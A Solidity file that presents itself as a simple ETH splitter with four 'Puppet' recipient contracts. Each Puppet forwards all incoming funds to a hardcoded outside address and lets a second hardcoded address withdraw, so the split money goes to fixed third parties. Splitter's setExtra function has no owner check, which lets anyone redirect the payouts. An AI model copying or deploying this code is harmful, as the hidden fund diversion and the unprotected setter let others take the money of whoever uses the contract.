pragma solidity ^0.8.0;

contract Splitter {
    address public owner;
    address[] public puppets;
    mapping(uint256 => address) public extra;
    uint256 private _share;

    constructor() payable {
        owner = msg.sender;
        newPuppet();
        newPuppet();
        newPuppet();
        newPuppet();
        extra[0] = puppets[0];
        extra[1] = puppets[1];
        extra[2] = puppets[2];
        extra[3] = puppets[3];
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    function getPuppetCount() public view returns (uint256 puppetCount) {
        return puppets.length;
    }

    function newPuppet() public returns (address newPuppet) {
        require(msg.sender == owner, "Only owner can create a new puppet");
        Puppet p = new Puppet();
        puppets.push(address(p));
        return address(p);
    }

    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0), "Invalid address");
        extra[_id] = _newExtra;
    }

    function fundPuppets() public payable {
        require(msg.sender == owner, "Only owner can fund puppets");
        _share = msg.value / 4;

        (bool success1,) = extra[0].call{value: _share, gas: 800000}("");
        require(success1, "Failed to send funds to puppet 1");

        (bool success2,) = extra[1].call{value: _share, gas: 800000}("");
        require(success2, "Failed to send funds to puppet 2");

        (bool success3,) = extra[2].call{value: _share, gas: 800000}("");
        require(success3, "Failed to send funds to puppet 3");

        (bool success4,) = extra[3].call{value: _share, gas: 800000}("");
        require(success4, "Failed to send funds to puppet 4");
    }

    receive() external payable {}
}

contract Puppet {
    mapping(uint256 => address) public target;
    mapping(uint256 => address) public master;

    constructor() payable {
        target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
    }

    receive() external payable {
        if (msg.sender != target[0]) {
            (bool success,) = target[0].call{value: msg.value, gas: 600000}("");
            require(success, "Failed to forward funds to target");
        }
    }

    function withdraw() public {
        require(msg.sender == master[0], "Only master can withdraw");
        payable(master[0]).transfer(address(this).balance);
    }
} 

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
}